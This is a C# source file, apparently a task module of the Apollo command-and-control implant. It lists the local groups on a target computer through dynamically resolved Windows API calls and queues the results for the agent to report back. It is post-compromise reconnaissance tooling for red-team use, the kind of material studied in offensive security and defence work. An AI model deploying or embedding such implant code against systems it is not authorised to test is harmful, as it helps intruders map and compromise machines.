#define COMMAND_NAME_UPPER

#if DEBUG
#define NET_LOCALGROUP
#endif

#if NET_LOCALGROUP

using ApolloInterop.Classes;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class net_localgroup : Tasking
    {
        #region typedefs

        [DataContract]
        internal struct NetLocalGroup
        {
            [DataMember(Name = "computer_name")]
            public string ComputerName;
            [DataMember(Name = "group_name")]
            public string GroupName;
            [DataMember(Name = "comment")]
            public string Comment;
            [DataMember(Name = "sid")]
            public string SID;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LocalGroupUsersInfo
        {
            public IntPtr name;
            public IntPtr comment;
        }

        private delegate int NetLocalGroupEnum(
            [MarshalAs(UnmanagedType.LPWStr)]
            string servername,
            int dwLevel,
            out IntPtr lpBuffer,
            int dwMaxLen,
            out int dwEntriesRead,
            out int dwTotalEntries,
            ref IntPtr lpResume);

        private delegate int NetApiBufferFree(
            IntPtr lpBuffer);

        private NetLocalGroupEnum _pNetLocalGroupEnum;
        private NetApiBufferFree _pNetApiBufferFree;
        
        /*
         [DllImport("Netapi32.dll")]
        internal extern static int NetLocalGroupEnum([MarshalAs(UnmanagedType.LPWStr)]
            string servername,
            int level,
            out IntPtr bufptr,
            int prefmaxlen,
            out int entriesread,
            out int totalentries,
            ref IntPtr resume_handle);
         */
        #endregion

        public net_localgroup(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
            _pNetLocalGroupEnum = _agent.GetApi().GetLibraryFunction<NetLocalGroupEnum>(Library.SAMCLI, "NetLocalGroupEnum");
            _pNetApiBufferFree = _agent.GetApi().GetLibraryFunction<NetApiBufferFree>(Library.NETUTILS, "NetApiBufferFree");
        }


        public override void Start()
        {
            TaskResponse resp = new TaskResponse { };
            int res = 0;
            int level = 1;
            IntPtr buffer = IntPtr.Zero;
            int MAX_PREFERRED_LENGTH = -1;
            int read = 0, total = 0;
            IntPtr handle = IntPtr.Zero;
            List<NetLocalGroup> results = new List<NetLocalGroup>();
            string serverName = _data.Parameters.Trim();
            if (string.IsNullOrEmpty(serverName))
            {
                serverName = Environment.GetEnvironmentVariable("COMPUTERNAME");
            }

            List<LocalGroupUsersInfo> groups = new List<LocalGroupUsersInfo>();
            try
            {
                
                res = _pNetLocalGroupEnum(serverName, level, out buffer, MAX_PREFERRED_LENGTH,
                    out read, out total, ref handle);

                if (res != 0)
                {
                    resp = CreateTaskResponse(
                        $"Error enumuerating local groups: {res}", true, "error");
                }
                else
                {
                    IntPtr ptr = buffer;
                    for (int i = 0; i < read; i++)
                    {
                        LocalGroupUsersInfo group =
                            (LocalGroupUsersInfo) Marshal.PtrToStructure(ptr, typeof(LocalGroupUsersInfo));
                        NetLocalGroup result = new NetLocalGroup();
                        result.ComputerName = serverName;
                        result.GroupName = Marshal.PtrToStringUni(@group.name);
                        result.Comment = Marshal.PtrToStringUni(@group.comment);
                        results.Add(result);
                        ptr = (IntPtr) ((int) ptr + Marshal.SizeOf(typeof(LocalGroupUsersInfo)));
                    }
                }
            }
            finally
            {
                if (buffer != IntPtr.Zero)
                {
                    _pNetApiBufferFree(buffer);
                }
            }

            if (resp.UserOutput == null)
            {
                resp = CreateTaskResponse(
                    _jsonSerializer.Serialize(results.ToArray()), true);
            }

            // Your code here..
            // Then add response to queue
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif